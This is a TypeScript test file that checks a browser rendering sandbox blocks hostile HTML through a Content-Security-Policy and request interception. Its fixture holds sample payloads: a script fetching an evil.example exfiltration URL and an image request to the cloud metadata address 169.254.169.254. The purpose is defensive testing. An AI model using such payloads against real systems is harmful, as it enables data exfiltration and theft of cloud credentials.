import { afterAll, describe, expect, it } from 'vitest';
import { printCsp } from '@hexadata/spec-templates/print';
import { BrowserPool } from '../src/browser-pool.ts';
import { DOCUMENT_PATH, installSandbox, RENDER_ORIGIN } from '../src/sandbox.ts';

const pool = new BrowserPool({
  concurrency: 1,
  queueMax: 0,
  recycleAfter: 1000,
  noSandbox: process.platform === 'linux',
});
afterAll(() => pool.close());

const HOSTILE = `<!doctype html><html><head><title>t</title></head><body>
<script>window.__pwned = 1; fetch('https://evil.example/exfil?c=1').catch(() => {}); document.title = 'pwned';</script>
<img src="http://169.254.169.254/latest/meta-data/">
<link rel="stylesheet" href="https://evil.example/x.css">
<iframe src="https://evil.example/frame"></iframe>
<p id="ok">visible</p></body></html>`;

async function load(html: string, withCsp: boolean) {
  const file = { body: Buffer.from(html), type: 'text/html; charset=utf-8' };
  return pool.run(async (context) => {
    const page = await context.newPage();
    const sandbox = await installSandbox(
      page,
      (path) => (path === DOCUMENT_PATH ? file : undefined),
      () => (withCsp ? { 'Content-Security-Policy': printCsp(RENDER_ORIGIN) } : undefined),
    );
    await page
      .goto(RENDER_ORIGIN + DOCUMENT_PATH, { waitUntil: 'load', timeout: 15_000 })
      .catch(() => undefined);
    // Give any (blocked) subresource requests a moment to be attempted.
    await new Promise((resolve) => setTimeout(resolve, 300));
    const state = await page.evaluate(() => ({
      pwned: (window as unknown as { __pwned?: number }).__pwned,
      title: document.title,
      text: document.getElementById('ok')?.textContent,
    }));
    return { state, blocked: sandbox.blocked };
  });
}

describe('request sandbox', () => {
  it('layer 1 (CSP): hostile inline script does not run and nothing leaves the machine', async () => {
    const { state, blocked } = await load(HOSTILE, true);
    expect(state.pwned).toBeUndefined();
    expect(state.title).toBe('t');
    expect(state.text).toBe('visible');
    // The CSP stops requests before they exist; whatever did reach the interceptor was aborted.
    for (const url of blocked) expect(url).not.toMatch(/^https:\/\/render\.local\//);
  });

  it('layer 2 (interception): even with the CSP missing, every outbound request is aborted', async () => {
    const { state, blocked } = await load(HOSTILE, false);
    expect(state.pwned).toBe(1); // the script ran (CSP was removed for this test)...
    // ...but its network access did not work: every external request was blocked.
    expect(blocked.some((url) => url.startsWith('https://evil.example/exfil'))).toBe(true);
    expect(blocked.some((url) => url.startsWith('http://169.254.169.254/'))).toBe(true);
    expect(blocked.some((url) => url.startsWith('https://evil.example/x.css'))).toBe(true);
    expect(blocked.some((url) => url.startsWith('https://evil.example/frame'))).toBe(true);
  });

  it('serves virtual files and blocks unknown paths on the virtual origin', async () => {
    const html = `<!doctype html><html><body><img id="a" src="${RENDER_ORIGIN}/missing.png"></body></html>`;
    const { blocked } = await load(html, false);
    expect(blocked).toContain(`${RENDER_ORIGIN}/missing.png`);
  });
});
